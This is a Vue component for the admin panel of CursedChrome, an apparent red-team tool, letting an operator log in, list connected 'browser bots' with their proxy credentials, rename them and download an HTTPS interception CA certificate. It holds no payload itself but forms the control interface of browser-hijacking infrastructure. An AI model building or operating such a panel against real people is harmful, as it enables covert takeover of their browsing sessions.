<template>
    <div>
        <!-- Loading bar -->
        <div class="fixed-bottom" v-if="loading">
          <b-progress :value="100" variant="success" striped :animated="true"></b-progress>
        </div>
        <!-- Navbar, only displayed when logged in -->
        <div v-if="user.is_authenticated">
            <b-navbar toggleable="lg" type="dark" variant="primary" fixed="top" sticky>
                <b-navbar-brand href="#">CursedChrome Admin Control Panel</b-navbar-brand>
                <b-navbar-toggle target="nav-collapse"></b-navbar-toggle>
                <b-collapse id="nav-collapse" is-nav>
                    <b-navbar-nav>
                        <b-nav-item target="_blank" href="https://github.com/mandatoryprogrammer/CursedChrome">
                            <font-awesome-icon :icon="['fab', 'github']" class="icon alt mr-1 ml-1"></font-awesome-icon> Repo
                        </b-nav-item>
                        <b-nav-item target="_blank" href="https://twitter.com/IAmMandatory">
                            <font-awesome-icon :icon="['fab', 'twitter']" class="icon alt mr-1 ml-1"></font-awesome-icon> @IAmMandatory
                        </b-nav-item>
                    </b-navbar-nav>
                    <b-navbar-nav class="ml-auto">
                        <b-nav-item>
                             <font-awesome-icon :icon="['fas', 'user']" class="icon alt mr-1 ml-1"></font-awesome-icon>
                              Logged in as: <b>{{user.username}}</b> 
                        </b-nav-item>
                        <b-nav-item v-on:click="logout">
                            Sign Out <font-awesome-icon :icon="['fas', 'sign-out-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon>
                        </b-nav-item>
                    </b-navbar-nav>
                </b-collapse>
            </b-navbar>
            <b-alert variant="warning" class="text-center" show v-if="user.password_should_be_changed">
                <p>
                    <font-awesome-icon :icon="['fas', 'exclamation-triangle']" class="icon alt mr-1 ml-1"></font-awesome-icon>
                    You are currently using a system-generated password, please update your account password.
                </p>
                <b-button variant="primary" v-on:click="show_update_password_modal">
                    <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1"></font-awesome-icon> Update Password
                </b-button>
            </b-alert>
        </div>
        <div id="main">
            <!-- Login Page -->
            <div v-if="!user.is_authenticated">
                <div class="form-signin" style="max-width: 300px; margin: 0 auto;">
                    <div class="text-center mb-4">
                        <h1 class="h3 mb-3 font-weight-normal">
                            CursedChrome
                            <br />
                            Admin Panel
                        </h1>
                        <b-alert show>
                            <font-awesome-icon :icon="['fas', 'info-circle']" class="icon alt mr-1 ml-1"></font-awesome-icon> <i>If this is your first time logging in, please use the credentials printed to your console when you first set the service up.</i>
                        </b-alert>
                    </div>
                    <div class="input-group mb-2" style="width: 100%">
                        <div class="input-group-prepend">
                            <span class="input-group-text" style="min-width: 100px;">Username</span>
                        </div>
                        <input type="text" class="form-control" placeholder="admin" v-model="user.login.username" autofocus />
                    </div>
                    <div class="input-group mb-3" style="width: 100%">
                        <div class="input-group-prepend">
                            <span class="input-group-text" style="min-width: 100px;">Password</span>
                        </div>
                        <input type="password" class="form-control" placeholder="********" v-model="user.login.password" />
                    </div>
                    <button class="btn btn-lg btn-primary btn-block" v-on:click="log_in">
                        <font-awesome-icon :icon="['fas', 'sign-in-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon> Sign in
                    </button>
                </div>
            </div>
            <!-- Admin panel controls -->
            <div v-if="user.is_authenticated">
                <!-- Bots panel -->
                <b-card-group deck>
                    <b-card border-variant="primary" header="CursedChrome Bots" header-bg-variant="primary" header-text-variant="white" align="center">
                        <b-card-text>
                            <h1>Connected Browser Bot(s)</h1>
                            <table class="table table-striped">
                                <thead>
                                    <tr>
                                        <th scope="col">Name</th>
                                        <th scope="col">HTTP Proxy Credentials</th>
                                        <th scope="col">Online?</th>
                                        <th scope="col">Options</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr v-for="bot in bots" v-bind:key="bot.id">
                                        <td scope="row" style="vertical-align: middle;">
                                            {{bot.name}}
                                        </td>
                                        <td style="vertical-align: middle;">
                                            <div>
                                                <div class="input-group" style="width: 100%">
                                                    <div class="input-group-prepend">
                                                        <span class="input-group-text" style="min-width: 100px;">Username</span>
                                                    </div>
                                                    <input type="text" class="form-control" placeholder="Please wait..." v-bind:value="bot.proxy_username">
                                                    <div class="input-group-append">
                                                        <span class="input-group-text copy-element" v-bind:data-clipboard-text="bot.proxy_username" v-on:click="copy_toast">
                                                            <font-awesome-icon :icon="['fas', 'clipboard']" class="icon alt mr-1 ml-1" /></span>
                                                    </div>
                                                </div>
                                                <div class="input-group" style="width: 100%">
                                                    <div class="input-group-prepend">
                                                        <span class="input-group-text" style="min-width: 100px;">Password</span>
                                                    </div>
                                                    <input type="text" class="form-control" placeholder="Please wait..." v-bind:value="bot.proxy_password">
                                                    <div class="input-group-append copy-element" v-bind:data-clipboard-text="bot.proxy_password" v-on:click="copy_toast">
                                                        <span class="input-group-text">
                                                            <font-awesome-icon :icon="['fas', 'clipboard']" class="icon alt mr-1 ml-1" /></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                        <td class="table-success online-col" style="vertical-align: middle;" v-if="bot.is_online">
                                            <span class="online-symbol">
                                                <font-awesome-icon :icon="['fas', 'check-circle']" class="icon alt mr-1 ml-1" />
                                            </span>
                                        </td>
                                        <td class="online-col table-danger p-0" style="vertical-align: middle;" v-if="!bot.is_online">
                                            <span class="offline-symbol">
                                                <font-awesome-icon :icon="['fas', 'times-circle']" class="icon alt mr-1 ml-1" />
                                            </span>
                                        </td>
                                        <td style="vertical-align: middle;">
                                            <b-button variant="primary" v-on:click="bot_open_options(bot.id)">
                                                <font-awesome-icon :icon="['fas', 'cog']" class="icon alt mr-1 ml-1" /> Options
                                            </b-button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </b-card-text>
                    </b-card>
                </b-card-group>
                <!-- Options panel -->
                <b-card-group deck class="mt-4">
                    <b-card border-variant="info" header="Options" header-bg-variant="info" header-text-variant="white" align="center">
                        <b-card-text>
                            <b-button variant="info" v-on:click="download_ca">
                                <font-awesome-icon :icon="['fas', 'download']" class="icon alt mr-1 ml-1" /> Download HTTPS Proxy CA Certificate <i>(Required to Use HTTP Proxy)</i>
                            </b-button>
                        </b-card-text>
                    </b-card>
                </b-card-group>
                <!-- Bot options modal -->
                <div v-if="options_selected_bot">
                    <b-modal id="bot_options_modal" title="Bot Options & Info" ok-only ok-variant="secondary" ok-title="Close">
                        <p>
                            This bot has a User-Agent of <code>{{ options_selected_bot.user_agent }}</code> and was first seen {{ options_selected_bot.createdAt | moment("MMMM Do YYYY, h:mm:ss a") }}.
                        </p>
                        <p>
                            Bot UUID is <code>{{options_selected_bot.id}}</code>
                        </p>
                        <hr />
                        <div class="input-group">
                            <div class="input-group-prepend">
                                <span class="input-group-text">Bot Name</span>
                            </div>
                            <input type="text" class="form-control" placeholder="Please wait..." v-model="options_selected_bot.name" autofocus>
                            <b-button variant="primary" v-on:click="update_bot_name">
                                <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1" /> Rename
                            </b-button>
                        </div>
                    </b-modal>
                </div>
                <!-- Update user password modal -->
                <div>
                    <b-modal id="update_password_modal" title="Update Account Password" ok-only ok-variant="secondary" ok-title="Never mind">
                        <p>
                            Enter your new password below
                        </p>
                        <div class="input-group mb-2">
                            <div class="input-group-prepend">
                                <span class="input-group-text">New Password</span>
                            </div>
                            <input type="password" class="form-control" placeholder="******" v-model="update_password.new_password" autofocus>
                        </div>
                        <div class="input-group mb-2">
                            <div class="input-group-prepend">
                                <span class="input-group-text">New Password (Again)</span>
                            </div>
                            <input type="password" class="form-control" placeholder="******" v-model="update_password.new_password_again" autofocus>
                        </div>
                        <b-alert class="text-center" show variant="danger" v-if="!change_passwords_match">
                          <font-awesome-icon :icon="['fas', 'exclamation-circle']" class="icon alt mr-1 ml-1" /> Both passwords do not match, double check your inputs.
                        </b-alert>
                        <b-button variant="primary btn-block" v-bind:disabled="!change_passwords_match" v-on:click="update_user_password">
                            <font-awesome-icon :icon="['fas', 'key']" class="icon alt mr-1 ml-1" /> Change Password
                        </b-button>
                    </b-modal>
                </div>
            </div>
        </div>
    </div>
</template>
<script>
export default {
    name: 'Main',
    components: {},
    data() {
        window.app = this;
        return {
            update_password: {
              new_password: '',
              new_password_again: '',
            },
            user: {
                is_authenticated: false,
                username: null,
                password_should_be_changed: null,
                login: {
                    username: '',
                    password: ''
                }
            },
            loading: false,
            bots: [],
            options_selected_bot: {},
        }
    },
    computed: {
      change_passwords_match() {
        return this.update_password.new_password === this.update_password.new_password_again;
      }
    },
    methods: {
        async update_user_password() {
            await api_request(
                'PUT',
                '/password',
                {
                  new_password: this.update_password.new_password
                }
            );
            this.user.password_should_be_changed = false;
            this.$nextTick(() => {
                this.$bvModal.hide('update_password_modal');
            });
        },
        show_update_password_modal() {
            this.$nextTick(() => {
                this.$bvModal.show('update_password_modal');
            });
        },
        async update_auth_status() {
            try {
                var auth_result = await api_request(
                    'GET',
                    '/me',
                    false,
                );
            } catch (e) {
                return
            }

            this.user.is_authenticated = true;
            this.user.username = auth_result.username;
            this.user.password_should_be_changed = auth_result.password_should_be_changed;
        },
        async log_in() {
            try {
                var login_result = await api_request(
                    'POST',
                    '/login', {
                        'username': this.user.login.username,
                        'password': this.user.login.password,
                    }
                );
            } catch (e) {
                console.error(`Invalid login.`);
                console.error(e);
                this.$toastr.e(e.error);
                return
            }
            // Clear password field
            this.user.login.password = '';

            this.user.is_authenticated = true;
            this.user.username = login_result.username;
            this.user.password_should_be_changed = login_result.password_should_be_changed;

        },
        async update_bot_name() {
            await api_request(
                'PUT',
                '/bots', {
                    'bot_id': this.options_selected_bot.id,
                    'name': this.options_selected_bot.name
                }
            );
            this.$toastr.s('Bot renamed succesfully.');
            this.refresh_bots();
        },
        bot_open_options(bot_id) {
            this.options_selected_bot = copy(this.get_selected_bot(bot_id));
            this.$nextTick(() => {
                this.$bvModal.show('bot_options_modal');
            });
        },
        async refresh_bots() {
            const response = await api_request(
                'GET',
                '/bots',
                false
            );
            this.bots = response.bots;
        },
        download_ca() {
            window.location = `${BASE_API_PATH}/download_ca`;
        },
        copy_toast() {
            this.$toastr.s('Copied to clipboard successfully.');
        },
        get_selected_bot(options_selected_bot_id) {
            if (options_selected_bot_id === null) {
                return null;
            }

            const matching_bot = this.bots.filter(bot => {
                return bot.id === options_selected_bot_id;
            });
            return matching_bot[0];
        },
        async logout() {
            await api_request(
                'GET',
                '/logout',
                false
            );
            this.user.is_authenticated = false;
            this.user.password_should_be_changed = null;
        },
    },
    // Run on page load
    mounted: async function() {
        new ClipboardJS('.copy-element'); // eslint-disable-line

        // Update auth status
        await this.update_auth_status();

        if (this.user.is_authenticated) {
            this.refresh_bots();
        }

        setInterval(() => {
            if (this.user.is_authenticated) {
                this.refresh_bots();
            }
        }, (1000 * 2));
    },
}

function copy(input_data) {
    return JSON.parse(JSON.stringify(input_data));
}

const BASE_API_PATH = `${location.origin.toString()}/api/v1`;

async function api_request(method, path, body) {
    var request_options = {
        method: method,
        credentials: 'include',
        mode: 'cors',
        cache: 'no-cache',
        headers: {
            'Content-Type': 'application/json',
        },
        redirect: 'follow'
    };

    if (body) {
        request_options.body = JSON.stringify(body);
    }

    window.app.loading = true;

    try {
      var response = await fetch(
          `${BASE_API_PATH}${path}`,
          request_options
      );
    } catch ( e ) {
      window.app.loading = false;
      throw e;
    }
    window.app.loading = false;

    const response_body = await response.json();

    if (!response_body.success) {
        return Promise.reject({
            'error': response_body.error,
            'code': response_body.code
        })
    }

    return response_body.result;
}
</script>
<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
.online-col {
    width: 20px;
    text-align: center;
}

.offline-symbol {
    font-size: 30px;
    color: #fc0303;
}

.online-symbol {
    font-size: 30px;
    color: #00c914;
}

#main {
    font-family: Avenir, Helvetica, Arial, sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    text-align: center;
    color: #2c3e50;
    padding-top: 10vh;
    max-width: 800px;
    width: 50%;
    margin: 0 auto;
    top: 50%;
}

.navbar-dark .navbar-nav .nav-link {
    color: rgba(255, 255, 255, 1);
}
</style>